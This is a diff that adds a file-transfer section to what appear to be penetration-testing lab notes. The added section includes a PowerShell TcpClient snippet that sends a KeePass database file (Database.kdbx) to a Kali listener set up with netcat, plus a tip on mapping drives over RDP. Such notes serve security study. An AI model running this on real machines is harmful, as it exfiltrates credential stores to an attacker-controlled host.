@@ -438,7 +438,22 @@ nc <target_ip> 1234 < nmap
 #Target
 nc -lvp 1234 > nmap
 ```
+- Powershell File transfer
+- Then if you have rdp you can add /drive:/tmp,tmp at the end of your command and it will map tmp on kali to tmp on client. Super easy to just drag and drop files.  Putting spoiler tags but don't really think file transfer techniques are spoilers.
+<a href="https://discord.com/channels/780824470113615893/1087927556604432424/1278089984737411092">Discord</a>
+```powershell
 
+From Windows:   First start kali NC command
+$client = New-Object System.Net.Sockets.TcpClient("192.168.45.182", 1234) 
+$stream = $client.GetStream() 
+[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\Users\jim\Documents\Database.kdbx") 
+$stream.Write($buffer, 0, $buffer.Length) 
+$stream.Close() 
+$client.Close()
+
+From Kali: 
+nc -lvp 1234 > Database.kdbx
+```
 - Downloading on Windows
 
 ```powershell
